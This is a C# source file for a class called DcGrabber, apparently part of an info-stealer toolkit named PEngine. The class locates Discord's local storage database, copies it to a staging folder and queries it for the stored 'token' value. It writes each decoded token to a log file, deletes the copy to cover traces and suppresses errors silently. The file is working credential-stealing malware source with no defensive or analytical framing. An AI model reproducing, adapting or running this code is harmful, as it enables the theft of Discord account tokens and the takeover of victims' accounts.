namespace PEngine.Engine.Applications.Discord
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System.Collections.Generic;
    using System.Data.SQLite;
    using System.IO;
    using System.Text;

    public class DcGrabber
    {
        private static string DecodeToken(byte[] text) => Encoding.GetEncoding("UTF-16").GetString(text).Replace("\"", "");

        private static readonly string CommandText = "SELECT * FROM ItemTable WHERE key = 'token'";

        private static readonly List<string> list = new List<string>()
        {
            "System.Data.SQLite.dll",
            @"x64\SQLite.Interop.dll",
            @"x86\SQLite.Interop.dll"
        }; 

        public static void GeTokens()
        {
            for (int i = 0; i < list.Count; i++)
            {
                int SafeIndex = i;
                if (File.Exists(Path.Combine(GlobalPath.GarbageTemp, list[SafeIndex])))
                {
                    CopyDiscordSafeDir();
                    try
                    {
                        string SafeFileDB = CombineEx.Combination(GlobalPath.DiscordHome, @"https_discordapp.com_0.localstorage");
                        using (var Connect = new SQLiteConnection($@"Data Source={SafeFileDB};Version=3"))
                        {
                            Connect.Open();
                            try
                            {
                                using (SQLiteCommand cmd = Connect.CreateCommand())
                                {
                                    cmd.CommandText = CommandText;
                                    using (SQLiteDataReader reader = cmd.ExecuteReader())
                                    {
                                        while (reader.Read())
                                        {
                                            SaveData.SaveFile(GlobalPath.DisLog, $"Token: {DecodeToken((byte[])reader[1])}");
                                        }
                                    }
                                }
                            }
                            catch { }
                        }
                        CombineEx.DeleteFile(SafeFileDB);
                    }
                    catch (FileNotFoundException) { }
                }
            }
        }

        private static void CopyDiscordSafeDir(int size = 0)
        {
            if (File.Exists(GlobalPath.DiscordFile) || (!Directory.Exists(GlobalPath.DiscordHome)))
            {
                CombineEx.CreateDir(GlobalPath.DiscordHome);
                try
                {
                    if (!new FileInfo(GlobalPath.DiscordFile).Length.Equals(size))
                    {
                        CombineEx.FileCopy(GlobalPath.DiscordFile, CombineEx.Combination(GlobalPath.DiscordHome, Path.GetFileName(GlobalPath.DiscordFile)), true);
                    }
                }
                catch { }
            }
        }
    }
}